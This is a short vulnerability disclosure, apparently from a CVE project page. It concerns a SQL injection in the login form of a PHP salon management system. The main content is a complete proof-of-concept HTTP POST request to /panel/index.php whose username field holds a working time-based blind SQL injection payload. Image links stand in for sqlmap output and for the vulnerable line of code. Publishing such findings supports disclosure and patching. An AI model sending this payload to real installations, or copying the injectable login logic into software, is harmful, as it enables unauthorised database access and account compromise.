### Best salon management system project in php - SQLi

### Date: 2026-01/28
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/18171/best-salon-management-system-project-php.html
### Tested on: MacOs13.5 + phpstudy

# /index.php（SQLi）

### Sample request POC #1

```
POST /panel/index.php HTTP/1.1
Host: localhost:8887
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded

login=1&password=1&username='+AND+(SELECT+6462+FROM+(SELECT(SLEEP(5)))bhWl)+AND+'fuop'%3D'fuop
```

### sqlmap

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260128-155307.png "Best salon management system project in php")

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260128-155336.png "Best salon management system project in php")

### Vulnerability code
index.php:10
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260128-155358.png "Best salon management system project in php")
